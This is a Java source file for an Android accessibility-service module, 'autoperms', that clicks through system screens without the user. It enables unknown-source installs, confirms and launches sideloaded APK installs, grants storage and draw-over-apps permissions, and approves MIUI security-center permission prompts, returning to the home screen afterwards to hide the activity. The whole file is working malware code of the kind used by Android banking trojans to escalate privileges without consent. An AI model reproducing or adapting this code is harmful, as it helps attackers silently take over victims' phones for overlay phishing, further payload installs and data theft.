package com.service.app.accessibility;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.core.content.ContextCompat;

import com.service.app.Services.utils;
import com.service.app.defines;

import java.util.ArrayList;
import java.util.List;

import okhttp3.internal.Util;

public class autoperms {

    UtilAccess UtilAccessibility = new UtilAccess();
    static utils utl = new utils();
    defines consts = new defines();

    public void UnknownSources(AccessibilityService service, AccessibilityEvent event) {
        ComponentName componentName = null;
        try {
            componentName = new ComponentName(
                    event.getPackageName().toString(),
                    event.getClassName().toString()
            );
        }catch (Exception ignored){

            Log.d("mytag", String.valueOf(ignored));
        }
        if ((componentName.getPackageName() + ("/") + componentName.getClassName()).equals("com.android.settings/com.android.settings.Settings$ManageAppExternalSourcesActivity")) {
            UtilAccessibility.findSwitchAndClick(service.getRootInActiveWindow(),0);
            UtilAccessibility.findSwitchAndClick_Parent(service.getRootInActiveWindow(),0);
            Handler mHandler = new Handler(Looper.getMainLooper());
            mHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (consts.draw_over_apps) {
                        Handler mHandler = new Handler(Looper.getMainLooper());
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            if (!Settings.canDrawOverlays(service)) {
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + service.getPackageName()));
                                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                            service.startActivity(intent);
                                    }
                            }
                        }
                    } else {
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                    }
                    return;
                }
            }, 500);
        }
    }

    public void InstallApk(AccessibilityService service, AccessibilityEvent event){
        ComponentName componentName = null;
        try {
            componentName = new ComponentName(
                    event.getPackageName().toString(),
                    event.getClassName().toString()
            );
        }catch (Exception ignored){

            Log.d("mytag", String.valueOf(ignored));
        }

        AccessibilityNodeInfo nodeInfo = service.getRootInActiveWindow();
        if (nodeInfo == null) {
            return;
        }
        Log.d("installapk" , "autoperms");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR2) {

        if ((componentName.getPackageName() + ("/") + componentName.getClassName()).equals("com.google.android.packageinstaller/android.app.Dialog")) {
            Log.d("ACDEBUG", "com.google.android.packageinstaller/android.app.Dialog");
            List<AccessibilityNodeInfo> list5 = nodeInfo.findAccessibilityNodeInfosByViewId("com.android.packageinstaller:id/install_success");
            for (AccessibilityNodeInfo n : list5){
                List<AccessibilityNodeInfo> list4 = nodeInfo.findAccessibilityNodeInfosByViewId("android:id/button1");
                for (AccessibilityNodeInfo node : list4) {
                    if (node.toString().contains("android.widget.Button")) {
                        Log.d("ACDEBUG", "CLICKING "+node);
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        utl.SettingsWrite(service, "installapk", "0");
                    }
                }
            }
        }

        if ((componentName.getPackageName() + ("/") + componentName.getClassName()).equals("com.android.packageinstaller/android.app.Dialog")) {
            Log.d("ACDEBUG", "com.android.packageinstaller/android.app.Dialog");
            List<AccessibilityNodeInfo> list5 = nodeInfo.findAccessibilityNodeInfosByViewId("com.android.packageinstaller:id/install_success");
            for (AccessibilityNodeInfo n : list5){
                List<AccessibilityNodeInfo> list4 = nodeInfo.findAccessibilityNodeInfosByViewId("android:id/button1");
                for (AccessibilityNodeInfo node : list4) {
                    if (node.toString().contains("android.widget.Button")) {
                        Log.d("ACDEBUG", "CLICKING "+node);
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        utl.SettingsWrite(service, "installapk", "0");
                        Handler mHandler = new Handler(Looper.getMainLooper());
                        mHandler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                                return;
                            }
                        }, 1000);
                    }
                }
            }
        }

            if ((componentName.getPackageName() + ("/") + componentName.getClassName()).equals("com.google.android.packageinstaller/com.android.packageinstaller.PackageInstallerActivity")) {
                Log.d("ACDEBUG", "com.google.android.packageinstaller/com.android.packageinstaller.PackageInstallerActivity");
                List<AccessibilityNodeInfo> list4 = nodeInfo.findAccessibilityNodeInfosByViewId("com.android.packageinstaller:id/ok_button");
                for (AccessibilityNodeInfo node : list4) {
                    if (node.toString().contains("android.widget.Button")) {
                        Log.d("ACDEBUG", "CLICKING "+node);
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        utl.SettingsWrite(service, "installapk", "0");
                        Handler mHandler = new Handler(Looper.getMainLooper());
                        mHandler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                                return;
                            }
                        }, 1000);
                    }
                }
            }

        if ((componentName.getPackageName() + ("/") + componentName.getClassName()).equals(("com.google.android.packageinstaller/com.android.packageinstaller.InstallSuccess"))) {
            List<AccessibilityNodeInfo> list4 = nodeInfo.findAccessibilityNodeInfosByViewId(("com.android.packageinstaller:id/launch_button"));
            for (AccessibilityNodeInfo node : list4) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                utl.SettingsWrite(service, "installapk", "0");
                Handler mHandler = new Handler(Looper.getMainLooper());
                mHandler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                        return;
                    }
                }, 1000);
            }
        }
        if ((componentName.getPackageName() + ("/") + componentName.getClassName()).equals(("com.android.packageinstaller/com.android.packageinstaller.InstallSuccess"))) {
            List<AccessibilityNodeInfo> list4 = nodeInfo.findAccessibilityNodeInfosByViewId(("com.android.packageinstaller:id/launch_button"));
            for (AccessibilityNodeInfo node : list4) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                utl.SettingsWrite(service, "installapk", "0");
                Handler mHandler = new Handler(Looper.getMainLooper());
                mHandler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                        return;
                    }
                }, 1000);
            }
        }

        if ((componentName.getPackageName() + ("/") + componentName.getClassName()).equals(("com.miui.global.packageinstaller/com.miui.global.packageinstaller.GlobalPackageInstallerActivity"))) {
            List<AccessibilityNodeInfo> list4 = nodeInfo.findAccessibilityNodeInfosByViewId(("android:id/button1"));//List<AccessibilityNodeInfo> list4 = nodeInfo.findAccessibilityNodeInfosByText(get_str(szSettingOpen.split(szColon2)));
            for (AccessibilityNodeInfo node : list4) {
                //log(getApplicationContext(),node.toString());
                if (node.toString().contains("android.widget.Button")) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    utl.SettingsWrite(service, "installapk", "0");
                    Handler mHandler = new Handler(Looper.getMainLooper());
                    mHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                            return;
                        }
                    }, 1000);
                }

            }
        }

            if ((componentName.getPackageName() + ("/") + componentName.getClassName()).equals(("com.android.packageinstaller/android.app.Dialog"))) {
                Log.d("ACDEBUG", "com.android.packageinstaller/android.app.Dialog");
                List<AccessibilityNodeInfo> list4 = nodeInfo.findAccessibilityNodeInfosByViewId(("android:id/button1"));
                for (AccessibilityNodeInfo node : list4) {
                    if (node.toString().contains("android.widget.Button")) {
                        Log.d("ACDEBUG", "CLICKING "+node);
                        utl.SettingsWrite(service, "installapk", "0");
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Handler mHandler = new Handler(Looper.getMainLooper());
                        mHandler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                                return;
                            }
                        }, 1000);
                    }
                }
            }

        }
    }

    public void ExternalStorage(AccessibilityService service, AccessibilityEvent event) {
        ComponentName componentName = null;
        try {
            componentName = new ComponentName(
                    event.getPackageName().toString(),
                    event.getClassName().toString()
            );
        }catch (Exception ignored){

            Log.d("mytag", String.valueOf(ignored));
        }

        AccessibilityNodeInfo nodeInfo = service.getRootInActiveWindow();
        if (nodeInfo == null) {
            return;
        }
        List<AccessibilityNodeInfo> list4 = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR2) {
            list4 = nodeInfo.findAccessibilityNodeInfosByViewId("com.android.permissioncontroller:id/permission_allow_button");
        }
        for (AccessibilityNodeInfo node : list4) {
            if (node.toString().contains("android.widget.Button")){
                node.performAction(AccessibilityNodeInfo. ACTION_CLICK) ;
                return;
            }
        }

        if ((componentName.getPackageName() + ("/") + componentName.getClassName()).equals("com.android.settings/com.android.settings.Settings$AppManageExternalStorageActivity")) {
            UtilAccessibility.findSwitchAndClick(service.getRootInActiveWindow(),0);
            UtilAccessibility.findSwitchAndClick_Parent(service.getRootInActiveWindow(),0);
            Handler mHandler = new Handler(Looper.getMainLooper());
            mHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                    return;
                }
            }, 1000);
        }

    }

    public void muiu(AccessibilityService service, AccessibilityEvent event){
        ComponentName componentName = null;
        try {
            componentName = new ComponentName(
                    event.getPackageName().toString(),
                    event.getClassName().toString()
            );
        }catch (Exception ignored){

            Log.d("mytag", String.valueOf(ignored));
        }

        AccessibilityNodeInfo nodeInfo = service.getRootInActiveWindow();

        if ((componentName.getPackageName() + ("/") + componentName.getClassName()).equals(("com.miui.securitycenter/miui.app.AlertDialog"))) {
            //logNodeHeirarchy(getRootInActiveWindow(), 0);
            List<AccessibilityNodeInfo> list3 = nodeInfo.findAccessibilityNodeInfosByText(String.valueOf(consts.szPermis.split("::")));
            for (AccessibilityNodeInfo node : list3) {
                if (node.toString().contains("android.widget.CheckedTextView")) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return;
                }
            }

        }


        if ((componentName.getPackageName() + ("/") + componentName.getClassName()).equals(("com.miui.securitycenter/com.miui.permcenter.permissions.PermissionsEditorActivity"))) {
            //logNodeHeirarchy(getRootInActiveWindow(), 0);
            Handler mHandler = new Handler(Looper.getMainLooper());
            mHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    if(UtilAccessibility.findImagesAndClick(service.getRootInActiveWindow(),0)) {
                        utl.SettingsWrite(service, "miuiperm", "1");
                        Handler mHandler = new Handler(Looper.getMainLooper());
                        mHandler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                                return;
                            }
                        }, 2000);
                    } }
            }, 1000);
        }
    }

    public void OverlayApps(AccessibilityService service, AccessibilityEvent event) {
        AccessibilityNodeInfo nodeInfo = event.getSource();
        ComponentName componentName = null;
        try {
            componentName = new ComponentName(
                    event.getPackageName().toString(),
                    event.getClassName().toString()
            );
        }catch (Exception ignored){
            Log.d("mytag", String.valueOf(ignored));
        }
        if ((componentName.getPackageName() + ("/") + componentName.getClassName()).equals("com.android.settings/com.android.settings.Settings$AppDrawOverlaySettingsActivity")) {
            overlaySettingsBranch(nodeInfo, service);
        }

        if ((componentName.getPackageName() + ("/") + componentName.getClassName()).equals("com.android.settings/com.android.settings.Settings$OverlaySettingsActivity")) {
            overlaySettingsBranch(nodeInfo, service);
        }
    }

    private void overlaySettingsBranch(AccessibilityNodeInfo node, AccessibilityService cnt) {
        Log.d("===", "overlaySettingsBranch");

        List<AccessibilityNodeInfo> combinedSwChb = new ArrayList<AccessibilityNodeInfo>();
        combinedSwChb.addAll(UtilAccessibility.findNodeByClass(node, "switch"));
        combinedSwChb.addAll(UtilAccessibility.findNodeByClass(node, "checkbox"));

        if (combinedSwChb.size() >= 1) {
            Log.d("===", "Switches found: "+combinedSwChb.size());
            List<AccessibilityNodeInfo> labels = UtilAccessibility.findNodesByParameters(node, utl.getLabelApplication(cnt.getApplicationContext()), null, null, null, null, null, null);

            if (labels.isEmpty()) {
                Log.d("===", "No labels, scrolling");
                UtilAccessibility.scrollView(node);
                return;
            } else {
                for (AccessibilityNodeInfo label : labels){
                    Log.d("===", "Found label: "+label);
                    AccessibilityNodeInfo parent = label.getParent();
                    List<AccessibilityNodeInfo> parentCombinedSwChb = new ArrayList<AccessibilityNodeInfo>();
                    parentCombinedSwChb.addAll(UtilAccessibility.findNodeByClass(parent, "switch"));
                    parentCombinedSwChb.addAll(UtilAccessibility.findNodeByClass(parent, "checkbox"));
                    Log.d("===", "Switches found in label parent: "+parentCombinedSwChb.size());
                    if (parentCombinedSwChb.isEmpty()) {
                        Log.d("===", "Label is not related to any switches. Clicking first switch in root");
                        if (!combinedSwChb.get(0).isChecked()) {
                            UtilAccessibility.clickOnSwitchOrParent(combinedSwChb.get(0));
                        }
                        break;
                    } else {
                        for (AccessibilityNodeInfo sw : parentCombinedSwChb) {
                            Log.d("===", "Found switch in parent: " + sw);
                            if (!sw.isChecked()) {
                                UtilAccessibility.clickOnSwitchOrParent(sw);
                            }
                        }
                    }
                }
            }
        } else {
            Log.d("===", "Switches not found. Probably page is still loading");
            return;
        }

        Handler mHandler = new Handler(Looper.getMainLooper());
        mHandler.postDelayed(() -> {
            try {
                cnt.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }, 400);
    }


}
